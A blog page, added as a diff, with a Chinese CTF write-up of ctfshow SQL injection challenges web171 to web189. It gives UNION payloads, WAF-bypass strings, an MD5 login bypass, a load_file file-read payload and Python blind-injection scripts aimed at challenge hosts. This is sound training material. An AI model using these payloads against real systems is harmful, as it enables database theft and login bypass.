@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">web171-web190SQL注入篇</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/07/11 23:27:16</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <p>web171</p>
+<pre class="language-json" data-language="json"><code class="language-json">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre>
+<p>三栏一眼丁真，直接内容拼入即可。</p>
+<pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select 1,2,database() --+</code></pre>
+<p>查询库名：</p>
+<pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre>
+<p><code>information_schema,test,mysql,performance_schema,ctfshow_web</code><br>查询表名：</p>
+<pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</code></pre>
+<p><code>ctfshow_user</code><br>查询字段</p>
+<pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_user&#39; --+</code></pre>
+<p><code>id,username,password</code><br>三栏直接输出三种：</p>
+<pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select id,username,password from ctfshow_web.ctfshow_user --+</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688962855743-a9561019-8b4a-4ad8-a1b9-9829a17ae716.png" alt="image.png"><br>当然 sqlmap也是可以的。直接开注入</p>
+<h1 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h1><pre class="language-json" data-language="json"><code class="language-json">$sql &#x3D; &quot;select username,password from ctfshow_user2 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre>
+<p>现实位置变为了两个。<br>通过上题的数据库结构可以直接出payload</p>
+<pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select 1,password from ctfshow_web.ctfshow_user2  --+</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688978037707-0ffcb803-78fd-4c25-93a9-2c20d87eaa92.png" alt="image.png"></p>
+<h1 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h1><pre class="language-json" data-language="json"><code class="language-json">&#x2F;&#x2F;拼接sql语句查找指定ID用户
+$sql &#x3D; &quot;select id,username,password from ctfshow_user3 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre>
+<p>一样payload</p>
+<pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select 1,2,password from ctfshow_web.ctfshow_user3 --+</code></pre>
+<h1 id="web174、web175"><a href="#web174、web175" class="headerlink" title="web174、web175"></a>web174、web175</h1><p>说是考的基础，那么就一步一步来。</p>
+<pre class="language-json" data-language="json"><code class="language-json">&#x2F;&#x2F;拼接sql语句查找指定ID用户
+$sql &#x3D; &quot;select id,username,password from ctfshow_user2 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
+
+&#x2F;&#x2F;检查结果是否有flag
+    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;
+      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;
+    &#125;</code></pre>
+<p>有返回过滤了。<br>174、175怎么输入什么都提示错误。</p>
+<h1 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h1><h3 id="大小写绕过过滤"><a href="#大小写绕过过滤" class="headerlink" title="大小写绕过过滤"></a>大小写绕过过滤</h3><p>简单过滤，大小写就能绕过过滤。</p>
+<pre class="language-json" data-language="json"><code class="language-json">-1&#39; uNion SeLeCt 1,2,password from ctfshow_user --+</code></pre>
+<h1 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h1><h3 id="、-09、-0a-d绕过空格过滤"><a href="#、-09、-0a-d绕过空格过滤" class="headerlink" title="&#x2F;**&#x2F;、%09、%0a-%d绕过空格过滤"></a>&#x2F;**&#x2F;、%09、%0a-%d绕过空格过滤</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/acsuccess/article/details/69360931">https://blog.csdn.net/acsuccess/article/details/69360931</a> 绕过空格过滤</p>
+</blockquote>
+<p>过滤了空格，把空格更换一下即可<br>以下是几种常见绕过过滤的方法。</p>
+<ul>
+<li>注释绕过 <code>/**/</code></li>
+<li>括号绕过 <code>select(user())from dual where(1=1)and(2=2)</code></li>
+</ul>
+<p>除此之外要注意一下，上面几道题的payload中的+会被转义为空格，因此如果使用+就会出现无法查询的情况。<br>那么就要使用url转义来绕过空格。<br>比如：</p>
+<ul>
+<li>Tab &gt; %09</li>
+<li>换页符 &gt; %0c</li>
+</ul>
+<p>这两个都是可以的。<br>于是就可以得到payload：</p>
+<pre class="language-json" data-language="json"><code class="language-json">?id&#x3D;0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;id,username,password&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user&#x2F;**&#x2F;--%09</code></pre>
+<h1 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h1><h3 id="、-09、-0a-d绕过空格过滤-1"><a href="#、-09、-0a-d绕过空格过滤-1" class="headerlink" title="&#x2F;**&#x2F;、%09、%0a-%d绕过空格过滤"></a>&#x2F;**&#x2F;、%09、%0a-%d绕过空格过滤</h3><p>把<code>/**/</code>过滤掉了那就只能使用上面两个转义符绕过了。<br>那就用%09</p>
+<pre class="language-json" data-language="json"><code class="language-json">-1&#39;%09union%09select%091,2,password%09from%09ctfshow_user%09--%09</code></pre>
+<p>注意，经过测试，<code>%09</code>可以替换为<code>%0a-%0d</code>均可以</p>
+<h1 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h1><h3 id="、-09、-0a-d绕过空格过滤-2"><a href="#、-09、-0a-d绕过空格过滤-2" class="headerlink" title="&#x2F;**&#x2F;、%09、%0a-%d绕过空格过滤"></a>&#x2F;**&#x2F;、%09、%0a-%d绕过空格过滤</h3><p><code>/**/</code>等都被过滤了，可以使用%0c和%0d绕过过滤。</p>
+<pre class="language-json" data-language="json"><code class="language-json">-1&#39;%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0c--%0c</code></pre>
+<h1 id="web180-web182"><a href="#web180-web182" class="headerlink" title="web180-web182"></a>web180-web182</h1><p>过滤了所有的空白符号。<br>这里网上给的办法是直接去根据id直接查，其实也可以。</p>
+<pre class="language-json" data-language="json"><code class="language-json">-1&#39;||id&#x3D;26||&#39;
+或者
+-1&#39;or(id&#x3D;26)and&#39;&#39;&#x3D;&#39;</code></pre>
+<p>可以使用第二种这种将末尾的单引号闭合就可以不用注释符号了</p>
+<h1 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h1><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><pre class="language-json" data-language="json"><code class="language-json">function waf($str)&#123;
+    return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into&#x2F;i&#39;, $str);
+  &#125;</code></pre>
+<p>有两种payload。</p>
+<pre class="language-json" data-language="json"><code class="language-json">[POST]PAYLOAD:
+tableName&#x3D;&#96;ctfshow_user&#96;where((substr(&#96;pass&#96;,1,8)regexp(&quot;ctfshow&#123;&quot;)))
+
+[POST]PAYLOAD:
+tableName&#x3D;(ctfshow_user)where(pass)like&#39;ctfshow&#123;%25&#39;</code></pre>
+<p>这里分别解释一下两个语句：</p>
+<h2 id="regexp和like关键字-和-标识符"><a href="#regexp和like关键字-和-标识符" class="headerlink" title="regexp和like关键字 %和_标识符"></a>regexp和like关键字 %和_标识符</h2><p>第一个payload：<br>REGEXP 是 SQL 中的一个模式匹配操作符，它用于在字符串中查找与给定的正则表达式匹配的子串。<br>第二个paylaod：<br>LIKE操作符使用字符串匹配模式来比较列的值，常见的模式匹配特殊字符是 % (百分号) 和 _ (下划线)。<br>‘aa%’：这是一个用于匹配的模式。在这个例子中，’aa%’表示以”aa”开头的任意字符或字符串。%是LIKE操作符的通配符，代表任意数量的字符（包括零个字符）。<br>也就是匹配<code>aabbs</code><br>当我们使用 LIKE 操作符和下划线 _ 结合时，它表示匹配单个字符的任意位置，类似于通配符?<br>也就是匹配<code>aab</code><br>这里使用py写脚本。<br>第一种：</p>
+<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
+&quot;&quot;&quot;
+@File    :   SQL盲注.py   
+@Contact :   2997453446@qq.com
+@Blog    :   natro92.github.io
+ 
+@Modify Time      @Author    @Version    @Desciption
+------------      -------    --------    -----------
+2023&#x2F;7&#x2F;10 17:49   natro92      1.0         None
+&quot;&quot;&quot;
+import requests
+import string
+
+url &#x3D; r&#39;http:&#x2F;&#x2F;0d89238a-2c87-4371-b427-2670ebb10351.challenge.ctf.show&#x2F;select-waf.php&#39;
+str &#x3D; r&#39;0123456789-abcdefghijklmnopqrstuvwxyz&#125;&#39;
+flag_pre &#x3D; &#39;ctfshow&#123;&#39;
+payload &#x3D; &quot;(ctfshow_user)where(pass)regexp&#39;&#123;&#125;&#39;&quot;
+
+i &#x3D; 0
+key &#x3D; 0
+while(1):
+    if key &#x3D;&#x3D; 1:
+        break
+    print(i)
+    i &#x3D; i + 1
+    for j in str:
+        data &#x3D; &#123;
+            &#39;tableName&#39;: payload.format(flag_pre + j)
+        &#125;
+        r &#x3D; requests.post(url, data&#x3D;data)
+        if &#39;$user_count &#x3D; 1&#39; in r.text:
+            flag_pre +&#x3D; j
+            print(flag_pre)
+            if j &#x3D;&#x3D; &#39;&#125;&#39;:
+                key &#x3D; 1</code></pre>
+<p>第二种：</p>
+<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
+&quot;&quot;&quot;
+@File    :   SQL盲注.py   
+@Contact :   2997453446@qq.com
+@Blog    :   natro92.github.io
+ 
+@Modify Time      @Author    @Version    @Desciption
+------------      -------    --------    -----------
+2023&#x2F;7&#x2F;10 17:49   natro92      1.0         None
+&quot;&quot;&quot;
+import requests
+import string
+
+url &#x3D; r&#39;http:&#x2F;&#x2F;0d89238a-2c87-4371-b427-2670ebb10351.challenge.ctf.show&#x2F;select-waf.php&#39;
+str &#x3D; r&#39;0123456789-abcdefghijklmnopqrstuvwxyz&#125;&#39;
+flag_pre &#x3D; &#39;ctfshow&#123;&#39;
+payload &#x3D; &#39;(ctfshow_user)where(pass)like&quot;&#123;&#125;%&quot;&#39;
+
+
+i &#x3D; 0
+key &#x3D; 0
+while(1):
+    if key &#x3D;&#x3D; 1:
+        break
+    print(i)
+    i &#x3D; i + 1
+    for j in str:
+        data &#x3D; &#123;
+            &#39;tableName&#39;: payload.format(flag_pre + j)
+        &#125;
+        r &#x3D; requests.post(url, data&#x3D;data)
+        if &#39;count &#x3D; 1&#39; in r.text:
+            flag_pre +&#x3D; j
+            print(flag_pre)
+            if j &#x3D;&#x3D; &#39;&#125;&#39;:
+                key &#x3D; 1</code></pre>
+<h1 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h1><h3 id="右连接"><a href="#右连接" class="headerlink" title="右连接"></a>右连接</h3><pre class="language-python" data-language="python"><code class="language-python">&#x2F;&#x2F;对传入的参数进行了过滤
+  function waf($str)&#123;
+    return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);
+  &#125;
+</code></pre>
+<h2 id="什么是右连接"><a href="#什么是右连接" class="headerlink" title="什么是右连接"></a>什么是右连接</h2><p>SQL 中的右连接（Right Join）用于将两个表按照指定的列进行连接，并返回右侧表中所有行及其与左侧表中匹配行的列值，如果左侧表中没有匹配的行，则返回 NULL 值。<br>比如：</p>
+<pre class="language-python" data-language="python"><code class="language-python">SELECT columns
+FROM table1
+RIGHT JOIN table2
+ON table1.column &#x3D; table2.column;</code></pre>
+<p>比如：</p>
+<pre class="language-python" data-language="python"><code class="language-python">SELECT students.name, scores.score
+FROM students
+RIGHT JOIN scores
+ON students.id &#x3D; scores.student_id;</code></pre>
+<p>在这个例子中，我们使用 RIGHT JOIN 将 scores 表右连接到 students 表上，按照 students.id 和 scores.student_id 进行连接，查询学生姓名和对应的成绩。如果 scores 表中没有匹配的行，则返回 NULL 值。<br>因此这道题里面就可以使用如下payload：</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">tableName&#x3D;ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725</code></pre>
+<p><code>0x63746673686f7725</code>是ctfshow%的十六进制编码<br>python中可以使用以下代码实现转换为十六进制：</p>
+<pre class="language-python" data-language="python"><code class="language-python">import binascii
+print(binascii.b2a_hex(str(&#39;ctfshow%&#39;).encode()).decode().replace(&quot;b&#39;&quot;, &#39;&#39;).replace(&quot;&#39;&quot;, &quot;&quot;))</code></pre>
+<p>然后就可以写脚本：</p>
+<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
+&quot;&quot;&quot;
+@File    :   SQL盲注2.py
+@Contact :   2997453446@qq.com
+@Blog    :   natro92.github.io
+
+@Modify Time      @Author    @Version    @Desciption
+------------      -------    --------    -----------
+2023&#x2F;7&#x2F;10 19:49   natro92      1.0         None
+&quot;&quot;&quot;
+import requests
+import string
+import binascii
+
+
+def _2hex(s):
+    &quot;&quot;&quot;
+    :param s: 需要转为十六进制的字符串
+    :return: 十六进制结果
+    &quot;&quot;&quot;
+    return binascii.b2a_hex(s.encode()).decode().replace(&quot;b&#39;&quot;, &#39;&#39;).replace(&quot;&#39;&quot;, &quot;&quot;)
+
+
+url &#x3D; r&#39;http:&#x2F;&#x2F;303b0ea1-6fc8-4947-9730-47d85b4a3c1c.challenge.ctf.show&#x2F;select-waf.php&#39;
+str &#x3D; r&#39;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#39;
+flag_pre &#x3D; &#39;ctfshow&#123;&#39;
+payload &#x3D; &quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;&#125;&quot;
+
+i &#x3D; 0
+key &#x3D; 0
+while (1):
+    if key &#x3D;&#x3D; 1:
+        break
+    print(i)
+    i +&#x3D; 1
+    for j in str:
+        data &#x3D; &#123;
+            &#39;tableName&#39;: payload.format(&#39;0x&#39; + _2hex(flag_pre + j + &quot;%&quot;))
+        &#125;
+        r &#x3D; requests.post(url, data&#x3D;data)
+        if &#39;$user_count &#x3D; 43&#39; in r.text:
+            flag_pre +&#x3D; j
+            print(flag_pre)
+            if j &#x3D;&#x3D; &#39;&#125;&#39;:
+                key &#x3D; 1
+</code></pre>
+<p>注意，判断条件的43是使用payload所知道的。<br> 此外，还可以使用如下payload：</p>
+<pre class="language-python" data-language="python"><code class="language-python">tableName&#x3D;ctfshow_user group by pass having pass  like 0x63746673686f7725</code></pre>
+<h2 id="group-by和having关键字"><a href="#group-by和having关键字" class="headerlink" title="group by和having关键字"></a>group by和having关键字</h2><p>HAVING 是 SQL 中用于对分组后的结果进行筛选的关键字。它通常与 GROUP BY 关键字一起使用，用于对分组后的结果进行聚合计算和筛选。<br>比如：</p>
+<pre class="language-python" data-language="python"><code class="language-python">SELECT student, AVG(score) AS avg_score
+FROM scores
+GROUP BY student
+HAVING avg_score &gt;&#x3D; 90;</code></pre>
+<p><code>HAVING pass LIKE 0x63746673686f7725 </code>对分组后的结果进行筛选，只返回 pass 列中包含字符串 <code>0x63746673686f7725</code> 的分组。<br>这里就不写脚本了，注意所对应的条件是返回中存在<code>$user_count = 1</code></p>
+<h1 id="web185、web186"><a href="#web185、web186" class="headerlink" title="web185、web186"></a>web185、web186</h1><h3 id="使用true关键字等来绕过数字过滤-chr函数"><a href="#使用true关键字等来绕过数字过滤-chr函数" class="headerlink" title="使用true关键字等来绕过数字过滤 chr函数"></a>使用true关键字等来绕过数字过滤 chr函数</h3><p>数字被过滤了。</p>
+<pre class="language-php" data-language="php"><code class="language-php">function waf($str)&#123;
+  return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);
+&#125;</code></pre>
+<p>true关键字再mysql中等价为1，也就是可以true+true&#x3D;2，因此可以由此构造出任何数字。<br>因此我们可以字符串-&gt;转为十进制数字-&gt;chr和concat函数拼接合成为payload中的需要字符串。<br>脚本如下：</p>
+<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
+&quot;&quot;&quot;
+@File    :   SQL盲注3.py
+@Contact :   2997453446@qq.com
+@Blog    :   natro92.github.io
+
+@Modify Time      @Author    @Version    @Desciption
+------------      -------    --------    -----------
+2023&#x2F;7&#x2F;10 20:16   natro92      1.0         None
+&quot;&quot;&quot;
+import requests
+import string
+import binascii
+
+
+# 将数字转换为true相加
+def num2True(num):
+    a &#x3D; &#39;true&#39;
+    if num !&#x3D; 1:
+        for i in range(num - 1):
+            a +&#x3D; &#39;+true&#39;
+    return a
+
+    # 将文本转换为concat和chr函数结合的格式
+    # 比如：aa -&gt; chr(一大堆true相加),chr(又一大堆true相加)
+def change_style(s):
+    str1 &#x3D; &#39;&#39;
+    str1 +&#x3D; &#39;chr(&#39; + num2True(ord(s[0])) + &#39;)&#39;
+    for i in s[1:]:
+        str1 +&#x3D; &#39;,chr(&#39; + num2True(ord(i)) + &#39;)&#39;
+    return str1
+
+url &#x3D; r&#39;http:&#x2F;&#x2F;76c1b9c5-22be-4d38-8e83-4cdf71d2b93a.challenge.ctf.show&#x2F;select-waf.php&#39;
+str &#x3D; r&#39;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#39;
+flag_pre &#x3D; &#39;ctfshow&#123;&#39;
+payload &#x3D; &quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;&#125;))&quot;
+
+i &#x3D; 0
+key &#x3D; 0
+while (1):
+    if key &#x3D;&#x3D; 1:
+        break
+    print(i)
+    i +&#x3D; 1
+    for j in str:
+        data &#x3D; &#123;
+            &#39;tableName&#39;: payload.format(change_style(flag_pre + j + &#39;%&#39;))
+        &#125;
+        r &#x3D; requests.post(url, data&#x3D;data)
+        if &#39;$user_count &#x3D; 43&#39; in r.text:
+            flag_pre +&#x3D; j
+            print(flag_pre)
+            if j &#x3D;&#x3D; &#39;&#125;&#39;:
+                key &#x3D; 1
+</code></pre>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>不止有true可以生成任意数字，以下几个函数也可以：</p>
+<pre class="language-python" data-language="python"><code class="language-python">ceil() floor() true version() pi()</code></pre>
+<h1 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h1><h3 id="绕过sqlMD5加密的万能串ffifdyop"><a href="#绕过sqlMD5加密的万能串ffifdyop" class="headerlink" title="绕过sqlMD5加密的万能串ffifdyop"></a>绕过sqlMD5加密的万能串ffifdyop</h3><p>用MD5加密密码，<code>ffifdyop</code>正好可以得到<code>&#39;or&#39;6�]��!r,��b</code><br>也就达到了绕过的目的。<br>注意flag在返回包中。</p>
+<h1 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h1><h3 id="弱比较-sql中-等价于or"><a href="#弱比较-sql中-等价于or" class="headerlink" title="弱比较 sql中||等价于or"></a>弱比较 sql中||等价于or</h3><pre class="language-python" data-language="python"><code class="language-python">&#x2F;&#x2F;密码判断
+ if($row[&#39;pass&#39;]&#x3D;&#x3D;intval($password))&#123;
+     $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;
+     array_push($ret[&#39;data&#39;], array(&#39;flag&#39;&#x3D;&gt;$flag));
+   &#125;</code></pre>
+<p>flag为字符串，字符串的intval永远为0.因此传入0即可。<br><code>username=1||1&amp;password=0</code></p>
+<h1 id="web189"><a href="#web189" class="headerlink" title="*web189"></a>*web189</h1><h3 id="布尔盲注-if-load-file-locate"><a href="#布尔盲注-if-load-file-locate" class="headerlink" title="布尔盲注 if load_file locate"></a>布尔盲注 if load_file locate</h3><p>提示里有说：</p>
+<pre class="language-none"><code class="language-none">flag在api&#x2F;index.php文件中</code></pre>
+<p>那么这里就需要盲注来解决。<br>mysql导入外部文件查询。</p>
+<ul>
+<li>load_file(path)导入文件</li>
+<li>locate(substr,str)获取匹配到的字符串位置</li>
+</ul>
+<p>这道题的payload就是：</p>
+<pre class="language-python" data-language="python"><code class="language-python">if(locate(&quot;ctfshow&#123;&quot;,&#39; + &#39;load_file(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&quot;))&gt;这里是位置,0,1)</code></pre>
